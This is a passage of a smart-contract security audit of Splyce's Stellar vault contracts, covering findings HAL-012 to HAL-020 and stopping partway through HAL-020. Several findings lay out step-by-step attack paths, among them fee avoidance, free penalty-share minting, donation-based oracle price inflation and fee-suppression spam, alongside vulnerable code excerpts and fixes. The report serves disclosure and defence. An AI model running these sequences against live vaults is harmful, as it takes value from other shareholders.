### [SPLYCE-HAL-012] Management Fee Accrues During Pause Diluting Locked Shareholders

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 4.19 (AO:A/AC:L/AX:M/R:N/S:U/C:N/A:N/I:N/D:M/Y:M) (source: HAL-12) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | liveness-dos |
| **Location** | `contracts/stoken/src/stoken.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/a24a3849868361be5f4c73c6cf76093a849e4f28 |
| **Redacted** | false |

**Description.**

`SToken.accrue_management_fee()` mints dilutive fee shares to the accountant but contains no check for the vault's paused state. Every other state-modifying user-facing function, `deposit_underlying` (line 1028), `withdraw_request` (line 1041), and `swap_tokens` (line 2092), gates on `read_paused(&env)` and returns `STokenCoreError::VaultPaused`. `accrue_management_fee` is unrestricted (any external actor can call it) and bypasses this guard entirely, minting fee shares at any time including during an active emergency pause.

This creates an asymmetric harm: users cannot exit their positions while the vault is paused, but fee dilution continues unimpeded. An external actor (including the accountant itself, which is incentivized to do so) can call `accrue_management_fee` across any number of ledgers during the pause. Within a single ledger, idempotency protection at line 1383 blocks re-entry (`if time_elapsed <= 0 { return Ok(()); }`), but cross-ledger calls are unbounded. In an adversarial scenario where the manager deliberately maintains a pause to extract fees, users have no on-chain recourse: `emergency_withdraw` requires manager authorization and transfers underlying tokens (not shares), so locked shareholders cannot self-rescue.

For a vault with `management_fee_bps_per_year = 200` (2% annual), a 30-day pause on a $100M TVL vault: fee ≈ 2% × (30/365) ≈ 0.164% of total shares minted to accountant ≈ $164,000 of value transferred from locked shareholders to the accountant during the pause period.

#### Code Location

`SToken.accrue_management_fee()`**:** no pause check, callable by anyone

```rust
// contracts/stoken/src/stoken.rs
/// Accrue management fee (anyone can call)
pub fn accrue_management_fee(env: Env) -> Result<(), STokenCoreError> { // line 1368
    extend_contract_ttl(&env, BUMP_THRESHOLD, EXTEND_TO_DAYS);
    // NO pause check here
    let last_mgmt_fee_ts = read_last_mgmt_fee_ts(&env);
    // ...
    if fee_shares > 0 {
        Base::mint(&env, &accountant, fee_shares as i128); // mints during pause
        write_last_mgmt_fee_ts(&env, &timestamp);
    }
    Ok(())
}
```

`SToken.deposit_underlying()`**:** pause check present (contrast)

```rust
// contracts/stoken/src/stoken.rs
// deposit_core (called by deposit_underlying) at line 2869:
if read_paused(env) {
    return Err(STokenCoreError::VaultPaused);
}
```

**Impact.**

- During an emergency pause, shareholders are locked in and cannot exit their positions while management fees continue to dilute their proportional ownership.
- In a deliberate pause-to-extract scenario (malicious manager or guardian), the unchecked `accrue_management_fee` enables systematic extraction of value from captive shareholders, with no on-chain mechanism for users to prevent or recover from the dilution.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Add a pause check to `accrue_management_fee`, consistent with all other state-modifying vault functions. Note that blocking accrual while paused defers rather than waives the pause-period fees: when the vault unpauses, the next accrual call will cover the full elapsed window including the pause duration. If the intended behavior is to fully waive fees during a pause, the fee timestamp should additionally be advanced to the unpause moment when the vault is unpaused.
- If continued fee accrual during pauses is an intentional protocol design choice, this must be explicitly documented in the vault's risk disclosures, and users should be informed that emergency pauses do not stop fee dilution.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by adding a pause-guard to `accrue_management_fee` (no mint / no timestamp advance while paused), settling accrued fees at `pause_vault` time (best-effort), and waiving the paused window by resetting `last_mgmt_fee_ts` to `now` in `unpause_vault`.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-013] Swap Fee Read Only From Source Vault Enables Fee Avoidance

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 4.19 (AO:A/AC:L/AX:M/R:N/S:C/C:N/A:N/I:N/D:N/Y:M) (source: HAL-13) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | access-control-auth |
| **Location** | `contracts/stoken/src/stoken.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/576abe2d8d0d45c5eb0aba06fff89c5da5127d42 |
| **Redacted** | false |

**Description.**

`SToken.swap_tokens()` reads `swap_fee_bps` exclusively from the source vault's configuration, never consulting the destination vault's fee setting. Any vault share holder can exploit this by always initiating swaps from the lower-fee side of a mutually allowlisted pair:

1. Vault A is configured with `swap_fee_bps = 0`; vault B is configured with `swap_fee_bps = 50`.
2. The attacker calls `stoken_A::swap_tokens(alice, vault_B, amount, min_out)`.
3. `read_swap_fee_bps(&env)` returns vault A's `swap_fee_bps = 0`.
4. `fee_amount = apply_basis_points(underlying_value, 0) = 0`.
5. `calculate_split_fee_tokens(0, ...)` returns `(0, 0)`; both accountants receive no fee tokens.

#### Code Location

`SToken.swap_tokens()`: reads `swap_fee_bps` from source vault only; destination vault fee never queried

```rust
// Get swap fee from source vault configuration
let swap_fee_bps = read_swap_fee_bps(&env); // line 2167

let fee_amount = apply_basis_points(underlying_value, swap_fee_bps)  // line 2180
    .map_err(|_| STokenSwapError::MathOverflow)?;

// Calculate fee tokens split once for entire instruction (line 2200)
let (source_fee_tokens, dest_fee_tokens) =
    calculate_split_fee_tokens(fee_amount, source_price, dest_price)
        .map_err(|_| STokenSwapError::MathOverflow)?;
```

**Impact.**

When vault operators configure non-zero swap fees, any vault share holder can pay zero fee by routing through the lower-fee side of a mutually allowlisted pair. The destination vault's accountant collects no fee income on inbound swap volume, nullifying its configured fee policy entirely. All vaults that set a non-zero `swap_fee_bps` are exposed once paired with any zero-fee allowlisted counterpart.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- In `swap_tokens`, read `swap_fee_bps` from both the source and destination vaults and apply the higher of the two values; this enforces the strictest configured fee policy regardless of swap direction and prevents a vault's fee from being bypassed by routing through a zero-fee counterpart.
- Alternatively, enforce each vault's fee independently at its own callsite: the source vault deducts its configured fee from the source-side value, and the destination vault deducts its own configured fee from the destination share amount before minting to the user. This gives each vault full control over its own fee collection at the cost of a more invasive change to the swap and allowlist-mint logic.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-014] Late-Cancel Penalty Mints Free Shares Via Unfulfilled Withdrawal Requests

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 4.19 (AO:A/AC:L/AX:M/R:N/S:U/C:N/A:N/I:N/D:M/Y:M) (source: HAL-14) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | state-archival-ttl |
| **Location** | `contracts/stoken/src/stoken.rs:L1589-L1594`, `contracts/stoken/src/stoken.rs:L1283-L1285` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/5b5c7d4270d3c2b9e37556056ef9675fd9704b8f |
| **Redacted** | false |

**Description.**

`SToken.cancel_withdrawal()` on the TTL-expired path returns all shares to the user including the fee shares that were charged at request time, and additionally mints fresh penalty shares (default `system_penalty_bps = 50`, 0.5% of `shares_after_fee`) as compensation for the delay (stoken.rs:1589–1594). Because the returned shares are the same count as when they entered custody, and share price appreciates at the oracle rate during the custody period, a user who routes through `withdraw_request → wait-to-TTL → cancel_withdrawal` recovers their full position with no yield cost and gains penalty shares minted from thin air. The penalty is new supply that dilutes all other holders.

An attacker times the withdrawal request for a window when `total_idle` is low or externally locked positions prevent the processor from fulfilling within the minimum TTL (14 days). `fulfill_withdrawal` reverts whenever `amount_to_pay > total_idle` (stoken.rs:1283–1285); if liquidity is not restored within TTL, the attacker reaches the late-cancel path. Repeating the cycle extracts 0.5% of their position per cycle as dilution of honest holders.

**Step-by-step:**

1. Attacker submits `withdraw_request` for a large position timed to a window when `total_idle` is insufficient (e.g., after `process_deposits` has swept funds to an externally locked asset manager).
2. Processor cannot call `fulfill_withdrawal` because `amount_to_pay > total_idle` reverts.
3. After 14 days (minimum TTL), attacker calls `cancel_withdrawal`: receives all shares back (including refunded fee shares) plus 0.5% of `shares_after_fee` as newly minted penalty shares.
4. Net gain: 0.5% bonus shares per cycle; shares appreciated at oracle price throughout custody.
5. Repeat.

#### Code Location

`SToken.cancel_withdrawal()`: TTL-expired path refunds fees and mints penalty shares

```rust
// contracts/stoken/src/stoken.rs
} else { // TTL expired
    shares_to_transfer_to_user = shares_after_fee + fee_shares;   // line 1589 fees refunded
    penalty_shares_to_mint =
        apply_basis_points(shares_after_fee, read_system_penalty_bps(&env)) // line 1592
            .map_err(|_| STokenWithdrawalRequestError::MathOverflow)?;
}
```

`SToken.fulfill_withdrawal()`: reverts when vault lacks liquidity

```rust
// contracts/stoken/src/stoken.rs
if amount_to_pay > total_idle { // line 1283
    return Err(STokenWithdrawalRequestError::InsufficientFunds);
}
```

**Impact.**

Any share holder who can time or induce periods of low vault liquidity can extract `system_penalty_bps` (default 0.5%) of their position per 14-day cycle as newly minted shares, diluting all other holders. The mechanism converts a withdrawal request into a free option: if the processor fails to fulfill within TTL, the user recovers a fully appreciated position plus a bonus; if the processor does fulfill, the user receives the request-time-capped payout. The `MIN_WITHDRAWAL_TTL_SECS = 14 days` floor does not eliminate the incentive because a long-term holder treating the lockup as incidental still profits from each expired-TTL cycle.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Remove the fee refund on user-initiated TTL-expired cancellations, keeping withdrawal fees retained as on the early-cancel path. Gate penalty share minting exclusively on processor-initiated cancellations, not user-initiated ones; users cancelling after TTL should not receive a bonus regardless of how long they waited.
- Cap the value returned to the user on a TTL-expired user cancel to the economic equivalent of what was locked in at request time, so that price appreciation during custody does not accrue to the canceller. This removes the core incentive to time cycles around low-liquidity windows: the attacker gains nothing from holding through a price rise, whether or not the processor eventually fulfills.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by gating penalty-share minting on the TTL-expired cancellation path to `caller == processor`, so a user-initiated self-cancel returns only their own already-custodied shares (no new supply) while the free-penalty-mint dilution vector is closed.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-015] Price Staleness Check Bypassed Until First Oracle Update

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 3.93 (AO:A/AC:L/AX:M/R:P/S:C/C:N/A:N/I:H/D:H/Y:N) (source: HAL-15) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | oracle-external-dependency |
| **Location** | `contracts/stoken/src/stoken.rs:L307` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/2d66b61c5f9ef8736c5dd8309a1971f77fdfd5bf |
| **Redacted** | false |

**Description.**

`SToken.deposit_core()`, `SToken.redeem_core()`, and `SToken.swap_tokens()` all skip the price staleness check entirely when `last_price_update_timestamp == 0`. `initialize()` writes 0 to this field and it remains 0 until the first successful `update_price` call. This creates a window, from vault deployment until the oracle's first price update, during which deposits, withdrawals, and swaps operate on the `initial_price` with no time-based protection, regardless of how `max_price_staleness_secs` is configured.

The bypass is an intentional design choice that allows a vault to accept deposits before the oracle has submitted its first price. However, it creates two exploitable scenarios:

**Scenario A: Oracle misconfiguration / key loss:** If the oracle role is assigned to an incorrect or lost address, `last_price_update_timestamp` stays 0 indefinitely. `max_price_staleness_secs` never activates, and the vault accepts deposits at `initial_price` forever. The factory deploy flow assigns the oracle role at initialization; a typo or key-management failure triggers this path without any on-chain signal.

**Scenario B: Deliberate oracle withholding (active attack):** An entity that controls the oracle role intentionally withholds the first price update. This is feasible because `update_price` at line 953 computes `timestamp - read_last_price_update_timestamp(&env)` non-saturating: when `last_price_ts == 0`, the result equals the current unix timestamp (~1.7e9), which is far above any `price_update_cooldown_secs`.

The bypass also exists in `swap_tokens` for both source and destination vault price freshness checks (lines 2138 and 2151), extending the scope beyond deposits and withdrawals.

#### Code Location

`SToken.deposit_core()`**:** staleness check skipped when `last_price_ts == 0`

```rust
// contracts/stoken/src/stoken.rs
let last_price_ts = read_last_price_update_timestamp(env);
let max_staleness = read_max_price_staleness_secs(env);
if last_price_ts > 0 && max_staleness > 0 { // line 2875: skips check entirely when ts==0
    let price_age = env.ledger().timestamp().saturating_sub(last_price_ts);
    if price_age > max_staleness {
        return Err(STokenCoreError::PriceTooOld);
    }
}
// If last_price_ts == 0: no staleness check applied, initial_price used unconditionally
```

`SToken.initialize()`**:** `last_price_update_timestamp` set to 0

```rust
write_last_price_update_timestamp(&env, &0);
```

`SToken.redeem_core()`**:** identical bypass

```rust
let last_price_ts = read_last_price_update_timestamp(env);
let max_staleness = read_max_price_staleness_secs(env);
if last_price_ts > 0 && max_staleness > 0 { // line 3020: same bypass
    let price_age = env.ledger().timestamp().saturating_sub(last_price_ts);
    if price_age > max_staleness {
        return Err(STokenCoreError::PriceTooOld);
    }
}
```

**Impact.**

A vault with an incorrect oracle address or an intentionally withheld first price update operates indefinitely without staleness protection, accepting deposits, withdrawals, and swaps at a potentially stale or manipulated `initial_price`. Users who deposit during this window receive shares at the `initial_price` regardless of the true market price; if `initial_price` is biased, depositors are immediately mispriced.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Initialize `last_price_update_timestamp` to the vault creation timestamp in `initialize()` rather than 0, so the staleness guard activates immediately from deployment and the first oracle update must arrive within `max_price_staleness_secs`.
- This is simpler than adding a fallback to `created_at` in the check logic and eliminates the special-case `last_price_ts > 0` condition entirely.
- Apply the same fix to the `swap_tokens` staleness checks at lines 2138 and 2151.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by replacing the `last_price_ts > 0` bypass with a `price_staleness_baseline()` that falls back to the vault's `created_at` timestamp, closing the bypass window in `deposit_core`, `redeem_core`, and both sides of `swap_tokens`.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-016] NAV Oracle Raw Balance Enables Donation Price Manipulation

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 3.51 (AO:A/AC:M/AX:M/R:N/S:C/C:N/A:N/I:M/D:M/Y:N) (source: HAL-16) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | oracle-external-dependency |
| **Location** | `contracts/nav_oracle/src/nav_oracle.rs`, `contracts/stoken/src/stoken.rs:L1732` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/4f70241e821f397f836604e96450453cfd8813b6 |
| **Redacted** | false |

**Description.**

`NavOracle.update_vault_price_from_nav()` computes the vault's share price using the raw on-chain token balance (`underlying_asset.balance(&stoken_address)`) rather than the vault's internally tracked `total_idle` counter. Because anyone on Stellar can transfer tokens directly to any address, an attacker holding shares can inflate `vault_underlying_balance` without minting shares, causing the oracle to compute an inflated price that, if within the `max_deviation_bps` auto-accept window (default 50 bps), is applied immediately. The `expected_total_supply` guard does not prevent this because a direct token transfer does not alter total share supply.

The attack is not fully atomic: after submitting the withdrawal request at the inflated price, the attacker must wait for `fulfill_withdrawal` to be processed. During this window, the manager could call `withdraw_unexpected_deposits` to remove the donated tokens from the vault, however, this requires the manager to detect the attack on-chain and act before the processor fulfills the request, which may not occur in practice.

**Exploit path (multi-transaction, size-constrained by max_deviation_bps):**

1. Attacker holds S shares; current fair price is P (e.g. `total_idle = 110,000 USDC`, `total_supply = 110,000 shares`, `price = 1,000,000`).
2. Attacker directly transfers X tokens to the vault address (not via `deposit_underlying`), sizing X so the resulting price deviation remains within `max_deviation_bps` (≤ 50 bps auto-accept threshold).
3. NAV provider calls `update_vault_price_from_nav(nav_value=0, expected_total_supply=110,000)`; `vault_underlying_balance` reads as `total_idle + X`; `total_nav = X + total_idle`; inflated price is auto-applied.
4. Attacker calls `withdraw_request(S shares)`, payout is computed at the inflated price.
5. Processor calls `fulfill_withdrawal`; attacker receives `S × inflated_price / PRICE_PRECISION` underlying, more than fair value `S × P / PRICE_PRECISION`.
6. The donated X tokens remain as "unexpected deposits" in the vault until manager calls `withdraw_unexpected_deposits`.

Profitability condition: `S × ΔPrice / PRICE_PRECISION > X + Stellar resource fees`. Within the 50 bps auto-accept window the per-cycle gain is bounded, but the attack is repeatable across oracle update intervals.

#### Code Location

`NavOracle.update_vault_price_from_nav()`: raw balance used for price (lines 147-152)

```rust
// contracts/nav_oracle/src/nav_oracle.rs (lines 147-152)
let vault_underlying_balance = underlying_asset.balance(&stoken_address); // raw SAC balance

let total_nav = nav_value
    .checked_add(vault_underlying_balance as u64) // includes donated tokens
    .ok_or(NavOracleError::PriceCalculationOverflow)?;
```

`SToken.withdraw_unexpected_deposits()`: confirms the gap is real (stoken.rs:1732)

```rust
// contracts/stoken/src/stoken.rs (lines 1732-1733)
// vault_balance > total_idle  =>  the excess is "unexpected" and can be swept by manager
let vault_balance = Client::new(&env, &underlying_token).balance(&vault_address) as u64;
if vault_balance > total_idle {
    vault_balance.checked_sub(total_idle)?  // This is the donated amount
}
```

**Impact.**

An attacker can inflate the share price by up to `max_deviation_bps` (default 50 bps) per oracle update cycle by donating tokens directly to the vault. At 50 bps inflation per cycle, an attacker holding 10,000 shares against a 100,000-share vault can extract a small but non-zero profit per cycle, constrained by Stellar resource fees. A larger `max_deviation_bps` or more frequent oracle updates increase the per-cycle gain. Vault LPs (other share holders) bear the loss as their redemption value is diluted by the over-counted balance.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Replace the raw `underlying_asset.balance(&stoken_address)` call in `update_vault_price_from_nav` with a cross-contract call to `stoken.total_idle()`, which returns only formally-deposited and returned funds, excluding direct token transfers. The `total_idle()` accessor is already present in the SToken contract and needs to be added to the `STokenClient` trait in the oracle's contract interface.
- Update the `SToken` cross-contract trait in `nav_oracle.rs` to include `fn total_idle(env: Env) -> u64;` and replace the balance query with `stoken.total_idle()`.

This ensures donated tokens are invisible to the price oracle until they are formally accounted for via `deposit_underlying` or `return_funds`.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by replacing the raw `underlying_asset.balance(vault)` reading in `update_vault_price_from_nav` with a cross-contract call to `stoken.total_idle()`, following the recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-017] Management Fee Dilution Formula Uses Wrong Denominator

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 3.35 (AO:A/AC:L/AX:M/R:N/S:U/C:N/A:N/I:N/D:N/Y:M) (source: HAL-17) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | accounting-arithmetic |
| **Location** | `contracts/stoken/src/utils.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/b95efdee0d9d5318e82a537a4329d0f647b22cc6 |
| **Redacted** | false |

**Description.**

`calculate_management_fee` computes `fee_shares = S * r / (1 + r)` where `r = mgmt_fee_bps * elapsed_secs / (BPS_PRECISION * SECONDS_PER_YEAR)`, by placing `fee_rate_denominator + fee_rate_numerator` in the divisor. The standard supply-dilution formula, used by Yearn V2, Enzyme Finance, and Index Coop, to charge exactly `r` as a fraction of post-mint supply requires `fee_rate_denominator - fee_rate_numerator` (i.e., `S * r / (1 - r)`). With the additive denominator the realized fee as a fraction of post-mint supply is `r / (1 + 2r)` instead of `r`, an unconditional undercharge on every accrual regardless of interval length or caller.

Concrete derivation: after minting `fee_shares = S * r / (1 + r)`, post-mint supply becomes `S + S * r / (1 + r) = S * (1 + 2r) / (1 + r)`. Therefore `fee_shares / post_mint = r / (1 + 2r)`, not `r`.

#### Code Location

`calculate_management_fee()`**:** additive denominator diverges from dilution formula

```rust
// contracts/stoken/src/utils.rs
let fee_shares_denominator = fee_rate_denominator
    .checked_add(fee_rate_numerator)    // must be checked_sub for exact dilution (line 84)
    .ok_or(STokenCoreError::MathOverflow)?;

let fee_shares = fee_shares_numerator
    .checked_div(fee_shares_denominator)
    .ok_or(STokenCoreError::MathOverflow)?;
```

**Impact.**

At the maximum configured rate of 500 bps/year (5%), every annual accrual mints 47,619 fee shares per 1,000,000 total supply instead of the 52,631 the stated rate entitles: a 9.52% shortfall. The undercharge is unconditional: every call to `accrue_management_fee`, across any elapsed interval, permanently delivers fewer shares than the protocol's stated fee schedule, reducing the accountant's lifetime revenue and leaving existing shareholders with a proportionally larger stake than intended.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Replace `checked_add` with `checked_sub` in the denominator and add a saturation guard for the edge case where `fee_rate_numerator >= fee_rate_denominator` (i.e., `r >= 1`, reachable only if `accrue_management_fee` is not called for an extreme duration such as 20+ years at the maximum rate).
- If the current `/(1 + r)` bounded behavior, which caps `fee_shares < total_supply` even for multi-year un-accrued gaps, is an intentional design choice, the protocol must document the actual effective rate formula `r / (1 + 2r)` in its fee disclosures and not state that depositors are charged the nominal bps rate.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by replacing the additive denominator (`checked_add`) with a subtractive one (`checked_sub`) to implement the exact `f = S*r/(1-r)` dilution formula, and by adding an explicit `MathOverflow` guard for the `r >= 1` edge case, matching the recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-018] Zero-Accrual Management Fee Calls Advance Timestamp, Suppressing Revenue

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 3.37 (AO:A/AC:M/AX:M/R:N/S:U/C:N/A:N/I:N/D:N/Y:H) (source: HAL-18) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | accounting-arithmetic |
| **Location** | `contracts/stoken/src/stoken.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/1f4dc3e82b3d46bc472cadd33cbd9b19e91b521b |
| **Redacted** | false |

<!-- CONVERSION-NOTE: no Impact heading in the source: Impact repeats the first sentence; firm to rewrite -->

**Description.**

`SToken::accrue_management_fee` is permissionless and advances `last_mgmt_fee_ts` to the current timestamp even when integer truncation causes `fee_shares` to round down to zero, permanently discarding the unaccrued sub-threshold interval. Any caller can spam this function at short intervals to systematically suppress management fee revenue.

The function's zero-accrual branch (stoken.rs lines 1416–1419) writes the timestamp unconditionally even though no fee was minted:

```rust
// contracts/stoken/src/stoken.rs: lines 1396–1419
if fee_shares > 0 {
    Base::mint(&env, &accountant, fee_shares as i128);
    write_last_mgmt_fee_ts(&env, &timestamp);
    // ...
} else {
    // Just update timestamp even if no fees
    write_last_mgmt_fee_ts(&env, &timestamp); // line 1418, discards elapsed interval
}
```

**Arithmetic demonstrating truncation:** With `total_supply = 1_000` shares, `mgmt_fee_bps_per_year = 100` (1% annually), and `time_elapsed = 5` seconds:

```rust
fee_shares = total_supply * rate * elapsed / (BPS_PRECISION * SECONDS_PER_YEAR + rate * elapsed)
           = 1_000 * 100 * 5 / (10_000 * 31_536_000 + 100 * 5)
           = 500_000 / 315_360_000_500
           ≈ 0  (integer truncation)
```

Each sub-threshold call produces zero fee shares but advances `last_mgmt_fee_ts` by 5 seconds. The elapsed interval is permanently discarded, it cannot be recovered on the next call, which starts from the new (later) timestamp. A caller who repeats this at 5-second intervals suppresses 100% of management fee accrual without any stake or privilege requirement.

The function is explicitly open to all callers (stoken.rs line 1367 comment: `// anyone can call`):

```rust
// contracts/stoken/src/stoken.rs: line 1367
/// Accrue management fee (anyone can call)
pub fn accrue_management_fee(env: Env) -> Result<(), STokenCoreError> {
```

The attacker's economic motivation is share dilution reduction: a large depositor benefits from suppressing management fees because those fees mint new shares to the accountant, diluting existing holders. Preventing accrual preserves the attacker's proportional ownership at the expense of the protocol.

#### **Impact**

Repeated sub-threshold calls systematically suppress management fee accrual toward zero. The protocol's accountant receives fewer shares than it is entitled to. In the extreme case (continuous spam at the shortest feasible interval), near-100% of management fee revenue is eliminated without the attacker requiring any on-chain role or deposited capital, only Soroban transaction fees, whose economics may make sustained spam rational for large depositors who benefit from reduced dilution.

**Impact.**

`SToken::accrue_management_fee` is permissionless and advances `last_mgmt_fee_ts` to the current timestamp even when integer truncation causes `fee_shares` to round down to zero, permanently discarding the unaccrued sub-threshold interval.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Only advance `last_mgmt_fee_ts` when `fee_shares > 0`. When `fee_shares == 0`, return `Ok(())` without updating the timestamp, so the elapsed interval accumulates and is included in the next call's calculation.
- As a defense-in-depth measure, add a minimum elapsed interval check (e.g., reject calls where `time_elapsed < MIN_ACCRUAL_INTERVAL_SECS`) to prevent economically trivial spam from interacting with the accrual function at all.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by making `last_mgmt_fee_ts` advance only when the fee is genuinely zero (rate disabled or zero supply), while leaving it untouched on truncation-only zero-share results so elapsed time accumulates across calls.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-019] Upgrader Role Never Granted, All Contracts Permanently Non-Upgradeable

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 3.09 (AO:A/AC:L/AX:H/R:N/S:U/C:N/A:H/I:H/D:N/Y:N) (source: HAL-19) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | upgrade-migration |
| **Location** | `contracts/stoken/src/stoken.rs`, `contracts/factory/src/factory.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/3085c03851ada94222096450a02393e147b01db2 |
| **Redacted** | false |

**Description.**

All upgradeable contracts gate their WASM upgrade function behind `access_control::ensure_role(e, operator, "upgrader")`, but no address is ever granted the `upgrader` role during initialization, making every contract permanently non-upgradeable despite the `#[derive(Upgradeable)]` design intent.

Each contract's initializer calls `set_role_admin_no_auth` to designate `admin` as the role-admin for `upgrader`, but never calls `grant_role_no_auth` to assign the role to any address. The standard role-management entrypoints cannot fix this: `grant_role` panics unconditionally, and `propose_roles`/`accept_roles` only handle operational roles (`manager`, `processor`, `accountant`, `oracle`, `asset_manager`, `guardian`) while `upgrader` is not in the set. This creates a circular dependency: resolving the deadlock requires upgrading the contract, which in turn requires the `upgrader` role that does not exist.

#### Code Location

`SToken::initialize`**:** upgrader role-admin set but role never granted

```rust
// contracts/stoken/src/stoken.rs: lines 277–282
access_control::set_role_admin_no_auth(&env, &symbol_short!("upgrader"), &symbol_short!("admin"));
// Missing: access_control::grant_role_no_auth(&env, &admin, &config.upgrader, &symbol_short!("upgrader"))
```

`SToken::UpgradeableInternal::_require_auth`**:** always fails

```rust
// contracts/stoken/src/stoken.rs: line 3494
access_control::ensure_role(e, operator, &Symbol::new(e, "upgrader"));
```

`Factory::UpgradeableInternal::_require_auth`**:** same pattern

```rust
// contracts/factory/src/factory.rs: lines 284–288
impl UpgradeableInternal for Factory {
    fn _require_auth(e: &Env, operator: &Address) {
        access_control::ensure_role(e, operator, &Symbol::new(e, "upgrader"));
        operator.require_auth();
    }
}
```

`grant_role`panics unconditionally

```rust
// contracts/stoken/src/stoken.rs: lines 3502–3503
fn grant_role(_e: &Env, _caller: Address, _account: Address, _role: Symbol) {
    panic!("Use propose_roles/accept_roles instead");
}
```

**Impact.**

All seven contracts (`SToken`, `Factory`, `Accountant`, `NavOracle`, `ProxyAssetManager`, `FixedYieldOracle`, `Asset`) are permanently immutable. No bug fixes, security patches, or feature upgrades can be applied through the intended WASM upgrade path. Any discovered vulnerability in these contracts has no on-chain remediation path available to the protocol team.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- In each contract's initializer, call `access_control::grant_role_no_auth` to assign the `upgrader` role to a designated address immediately after `set_role_admin_no_auth`.
- Add an `upgrader` address field to `VaultInitConfig` and equivalent config structs for each contract so the upgrader can be specified independently of the admin at deployment time.
- Add `upgrader` to the `propose_roles`/`accept_roles` flow (or a dedicated `propose_upgrader`/`accept_upgrader` pair) so the upgrader address can be rotated post-deployment without requiring a WASM upgrade.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by granting the `upgrader` role to a configurable (default: admin) address at initialization in every affected contract, and adding admin-gated, timelocked `propose_upgrader`/`accept_upgrader` functions with a grant-before-revoke rotation pattern so the role can never become empty.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-020] Swap Mints Destination Shares Without Backing Underlying Transfer

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 3.14 (AO:A/AC:L/AX:M/R:P/S:C/C:N/A:M/I:M/D:M/Y:N) (source: HAL-20) |
| **Difficulty / likelihood** | null |
| **Status** | Risk Accepted |
| **Remediation verified by** | not-reviewed |
| **Category** | access-control-auth |
| **Location** | `contracts/stoken/src/stoken.rs` |
| **Resolved in** | null |
| **Redacted** | false |

**Description.**

`SToken.swap_tokens()` burns source-vault shares and mints destination-vault shares without transferring any underlying asset between vaults or updating `total_idle` on either side. `Base::mint` (called by `allowlist_mint`, line 453) is a share-token operation from the `stellar_tokens` crate; it creates share balances only and has no interaction with the underlying USDC or `write_total_idle`. Each swap therefore creates a symmetric accounting skew: source vault A retains `total_idle` that was backing the burned shares, while destination vault B carries new share obligations with no corresponding `total_idle` increase.

The precondition is that a manager has mutually allowlisted both vaults via `accept_allowlist_mint` on both sides. Once configured, any user holding source-vault shares can trigger the imbalance:

1. Source vault A and destination vault B are mutually allowlisted and share the same `asset_manager`. Vault B has 1,000 USDC of `total_idle` backing 1,000 existing shares.
